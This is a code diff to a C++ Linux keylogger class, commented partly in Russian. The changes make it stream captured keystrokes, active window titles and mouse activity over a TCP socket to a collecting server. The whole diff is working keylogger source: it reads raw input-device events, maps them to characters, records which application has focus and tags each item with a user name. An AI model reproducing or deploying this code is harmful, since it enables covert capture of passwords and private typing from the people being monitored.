@@ -8,20 +8,45 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <arpa/inet.h>
 #include <iostream>
 #include <errno.h>
 #include <string.h>
 #include <string>
 #include "async_write.h"
+#include <X11/Xlib.h>
+#include <X11/extensions/XInput2.h>
+#include <assert.h>
+#include <fstream>
+#include <sstream>
+#include "common.h"
 
-//inclide chrono
  std::string CurrentDateTime() {
     std::string output = "Date:  ";
     time_t seconds = time(nullptr);
     tm* pTm = localtime(&seconds);
     return output + asctime(pTm);
     }
-int check(int result) {
+std::string Date_Time()
+{
+    time_t rawtime;
+    tm * ptm;
+    std::string strTime;
+    std::stringstream out;
+
+    time (&rawtime);
+    ptm = gmtime (&rawtime);
+    out <<(1900+ptm->tm_year)<<"/"
+       <<(1+ptm->tm_mon)<<"/"
+       <<ptm->tm_mday<<", "
+       <<ptm->tm_hour<<":"
+       <<ptm->tm_min<<":"
+       <<ptm->tm_sec;
+    getline(out, strTime);
+    return strTime;
+}
+
+int check_path(int result) {
     if (result >= 0)
         return result;
 
@@ -183,33 +208,163 @@ Key_logger::Key_logger(){
         keys.insert({1058,"CAPSLOCK  "});
     }
 
-  
-   std::string  Key_logger::get_name_of_the_key(int key){
-        return keys[key];
-   } 
-   std::vector<std::string> Key_logger::get_keys_vector(std::string path){
-        FILE * file = fopen(path.c_str(),"a+");
-        int fd_async = fileno(file);
+void Key_logger::start(int port) {
+		_socket = socket(AF_INET, SOCK_STREAM, 0);
+
+		sockaddr_in addr{};
+		addr.sin_family = AF_INET;
+		addr.sin_port = htons(port);
+		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+
+		connect(_socket, (sockaddr*)&addr, sizeof(addr));
+		get_keys_vector();
+	}
+    void Key_logger::get_keys_vector(){
+        std::string Name;
+
+        std::cout << "Enter the name of the user >> ";
+        std::cin >> Name; 
+
+        #pragma region Инициализация для клавиатуры и текущего окна
+        // FILE * file_keyboard = fopen(path_of_keyboard.c_str(),"a+");
+        // int fd_async_keyboard = fileno(file_keyboard);
         std::vector<std::string> names;
-        names.push_back("\n\n");
-        names.push_back(CurrentDateTime());
+        //вместо пуш передать строчку на сервер
+        message send_msg_keys;
+        send_msg_keys.action = actions::KEYBOARD;
+        send_msg_keys.keys = "\n\n" + CurrentDateTime();
+        send_msg_keys.user_name = Name;
+        if (!try_send(_socket, send_msg_keys))
+               _exit(EXIT_FAILURE);
+
+        //names.push_back("\n\n" + CurrentDateTime());
         int keys_fd; //дескриптор
         struct input_event t;  
         struct input_event t_shift;
-        keys_fd = check(open(DEV_PATH, O_RDONLY));
-        std::cout << "#2" << std::endl;
+        keys_fd = check_path(open(DEV_PATH, O_RDONLY));
         bool flag_shift = false;
         bool flag_caps = false;
         std::string proc_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
-        names.push_back(proc_name);
+         //вместо пуш передать строчку на сервер
+        send_msg_keys.action = actions::KEYBOARD;
+        send_msg_keys.keys = proc_name;
+        send_msg_keys.user_name = Name;
+        if (!try_send(_socket, send_msg_keys))
+               _exit(EXIT_FAILURE); 
+        //names.push_back(proc_name);
+        #pragma endregion
+        
+    #pragma region Инициализация для мыши 
+    //На сервер
+    // FILE * file_mouse = fopen(path_of_mouse.c_str(),"a+");
+    // int fd_async_mouse = fileno(file_mouse);
+    //На сервер
+
+    Display *display;
+    Window root_window;
+    display = XOpenDisplay(0);
+    root_window = XRootWindow(display, 0);
+
+    int xi_opcode, event, error;
+    if (!XQueryExtension(display, "XInputExtension", &xi_opcode, &event, &error)) {
+        fprintf(stderr, "Error: XInput extension is not supported!\n");
+    }
+
+    int major = 2;
+    int minor = 0;
+    int retval = XIQueryVersion(display, &major, &minor);
+    if (retval != Success) {
+        fprintf(stderr, "Error: XInput 2.0 is not supported (ancient X11?)\n");
+    }
+
+    unsigned char mask_bytes[(XI_LASTEVENT + 7) / 8] = {0};  
+    XISetMask(mask_bytes, XI_RawMotion);
+
+    XIEventMask evmasks[1];
+    evmasks[0].deviceid = XIAllMasterDevices;
+    evmasks[0].mask_len = sizeof(mask_bytes);
+    evmasks[0].mask = mask_bytes;
+    XISelectEvents(display, root_window, evmasks, 1);
+
+    XEvent xevent;
+    auto first = time(NULL);
+    auto second = first;
+    auto write_flag_active = true;
+    auto write_flag_unactive = true;
+    std::vector<std::string> active_mouse;
+    message send_msg_mouse;
+    send_msg_mouse.action = actions::MOUSE;
+    send_msg_mouse.user_name = Name;
+    #pragma endregion
+
         while (true)
         {
+            if (time(NULL) - first > 6 && write_flag_active == true) {
+            std::string message = Date_Time();
+            send_msg_mouse.mice = message.append(" Mouse is UNACTIVE\n");
+            //active_mouse.push_back(message.append(" Mouse is UNACTIVE\n"));
+            if (!try_send(_socket, send_msg_mouse))
+                _exit(EXIT_FAILURE);
+            write_flag_active = false;
+            write_flag_unactive = true;
+            first = time(NULL);
+            }
+        while (XPending(display)) {
+            XNextEvent(display, &xevent);
+
+            if (xevent.xcookie.type != GenericEvent || xevent.xcookie.extension != xi_opcode) {
+                continue;
+            }
+            XGetEventData(display, &xevent.xcookie);
+            if (xevent.xcookie.evtype != XI_RawMotion) {
+                XFreeEventData(display, &xevent.xcookie);
+                continue;
+            }
+            XFreeEventData(display, &xevent.xcookie);
+
+            Window root_return, child_return;
+            int root_x_return, root_y_return;
+            int win_x_return, win_y_return;
+            unsigned int mask_return;
+            int retval = XQueryPointer(display, root_window, &root_return, &child_return,
+                                       &root_x_return, &root_y_return,
+                                       &win_x_return, &win_y_return,
+                                       &mask_return);
+            if (!retval) {
+                continue;
+            }
+            assert(root_x_return == win_x_return);
+            assert(root_y_return == win_y_return);
+
+
+            first = time(NULL);
             
+            if (write_flag_unactive == true) {
+                std::string message = Date_Time();
+                send_msg_mouse.mice = message.append(" Mouse is ACTIVE\n");
+            
+                if (!try_send(_socket, send_msg_mouse))
+                    _exit(EXIT_FAILURE);
+                //active_mouse.push_back(message.append(" Mouse is ACTIVE\n"));
+                write_flag_unactive = false;
+                write_flag_active = true;
+            }
+                if (child_return) {
+                int local_x, local_y;
+                XTranslateCoordinates(display, root_window, child_return,
+                                      root_x_return, root_y_return,
+                                      &local_x, &local_y, &child_return);
+            }
+        }
             std::string current_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
             if (current_name != proc_name)
             {
-                names.push_back("\n\n");
-                names.push_back(current_name);
+                send_msg_keys.action = actions::KEYBOARD;
+                send_msg_keys.keys = "\n\n" + current_name;
+                send_msg_keys.user_name = Name;
+                if (!try_send(_socket, send_msg_keys))
+                    _exit(EXIT_FAILURE);
+                //names.push_back("\n\n" + current_name);
                 proc_name = current_name;
             }
             if (read(keys_fd, &t, sizeof(t)) == sizeof(t))
@@ -233,16 +388,31 @@ Key_logger::Key_logger(){
                         {
                             if (flag_shift == true && flag_caps == false)
                             {
-                                names.push_back(keys[t.code + 1000]);
+                                 send_msg_keys.action = actions::KEYBOARD;
+                                 send_msg_keys.keys = keys[t.code + 1000];
+                                 send_msg_keys.user_name = Name;
+                                 if (!try_send(_socket, send_msg_keys))
+                                    _exit(EXIT_FAILURE);
+                                //names.push_back(keys[t.code + 1000]);
                                 std::cout << keys[t.code + 1000] << std::endl;
                             }
                             else if (flag_caps == true && flag_shift == false)
                             {
-                                names.push_back(keys[t.code + 1000]);
+                                send_msg_keys.action = actions::KEYBOARD;
+                                send_msg_keys.keys = keys[t.code + 1000];
+                                send_msg_keys.user_name = Name;
+                                if (!try_send(_socket, send_msg_keys))
+                                    _exit(EXIT_FAILURE);
+                                //names.push_back(keys[t.code + 1000]);
                                 std::cout << keys[t.code + 1000] << std::endl;
                             }
                             else
                             {
+                                send_msg_keys.action = actions::KEYBOARD;
+                                send_msg_keys.keys = keys[t.code];
+                                send_msg_keys.user_name = Name;
+                                 if (!try_send(_socket, send_msg_keys))
+                                    _exit(EXIT_FAILURE);
                                 names.push_back(keys[t.code]);
                                 std::cout << "key3 " << keys[t.code] << std::endl;
                             }
@@ -251,6 +421,11 @@ Key_logger::Key_logger(){
                         {
                             if (flag_shift == true)
                             {
+                                send_msg_keys.action = actions::KEYBOARD;
+                                send_msg_keys.keys = keys[t.code + 1000];
+                                send_msg_keys.user_name = Name;
+                                 if (!try_send(_socket, send_msg_keys))
+                                    _exit(EXIT_FAILURE);
                                 names.push_back(keys[t.code + 1000]);
                                 std::cout  << keys[t.code + 1000] << std::endl;
                                 if (t.code == 1)
@@ -258,6 +433,11 @@ Key_logger::Key_logger(){
                             }
                             if (flag_shift == false)
                             {
+                                send_msg_keys.action = actions::KEYBOARD;
+                                send_msg_keys.keys = keys[t.code];
+                                send_msg_keys.user_name = Name;
+                                 if (!try_send(_socket, send_msg_keys))
+                                    _exit(EXIT_FAILURE);
                                 names.push_back(keys[t.code]);
                                 std::cout  << keys[t.code] << std::endl;
                             }
@@ -265,27 +445,22 @@ Key_logger::Key_logger(){
                     }
 
                     if (t.code == 1001){
+                        send_msg_keys.action = actions::KEYBOARD;
+                        send_msg_keys.keys = "\n" + CurrentDateTime();
+                        if (!try_send(_socket, send_msg_keys))
+                            _exit(EXIT_FAILURE);
+                        send_msg_keys.action = actions::END;
                         std::cout << t.code << std::endl;
                         std::cout << "Exit" << std::endl;
-                        //std::vector<std::string> copy_names(names.begin(), names.begin() + 50);
-                        write_vector_async_file(names, fd_async);
-                        //names.erase(names.begin(), names.begin() + 50);
-                        names.clear();
                         break;
                     }
                 
             }
-            if (names.size() == 50)
-            {
-                std::vector<std::string> copy_names(names.begin(), names.begin() + 50);
-                write_vector_async_file(copy_names, fd_async);
-                //names.erase(names.begin(), names.begin() + 50);
-                names.clear();
-            }
+            
 
         }
+        
         close(keys_fd);
-        //names.push_back("\n"+ CurrentDateTime());
-        return names;  
+        XCloseDisplay(display);
     }
 #pragma endregion
